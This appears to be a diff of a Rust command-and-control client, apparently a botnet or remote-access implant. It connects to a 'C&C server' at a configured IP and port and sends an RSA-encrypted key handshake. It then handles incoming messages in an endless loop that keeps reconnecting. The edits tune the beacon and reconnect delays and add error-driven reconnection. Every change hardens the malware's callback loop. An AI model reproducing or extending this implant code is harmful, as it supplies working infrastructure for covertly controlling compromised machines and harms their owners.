@@ -1,7 +1,6 @@
 use std::thread;
 use std::time::Duration;
 use tokio::io::AsyncWriteExt;
-use tokio::signal;
 
 mod crypto;
 mod socket;
@@ -17,18 +16,18 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let handshake = format!("{} {}", base64::encode(&k.0), base64::encode(&n.0));
 
     loop {
-        thread::sleep(Duration::from_millis(1000));
+        thread::sleep(Duration::from_millis(3000));
         // connect to the socket
         let connection = socket::connect_to_cnc(IP, PORT).await;
 
         if let Err(_) = connection {
             continue;
-        } // Break if connection refused.
+        } // Break if connection is refused.
 
         println!("Connected to C&C server successfully");
 
         let mut stream = socket::SocketStream::new(connection.unwrap(), &k, &n);
-        // TODO : Use the RSA :facepalm:
+
         // send handshake
         println!("Sending handshake");
         let rsa_encrypted_handshake =
@@ -53,9 +52,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             if n_bytes == 0 {
                 break; // try to reconnect
             }
-            stream.handle_msg(msg, n_bytes).await;
+
+            let handle_res = stream.handle_msg(msg, n_bytes).await;
+            if handle_res.is_err() {
+                break // try to reconnect something bad probably happened
+            } 
         }
 
-        eprintln!("Disconnected, trying to reconnect in 5 seconds...");
+        eprintln!("Disconnected, trying to reconnect in 3 seconds...");
     }
 }
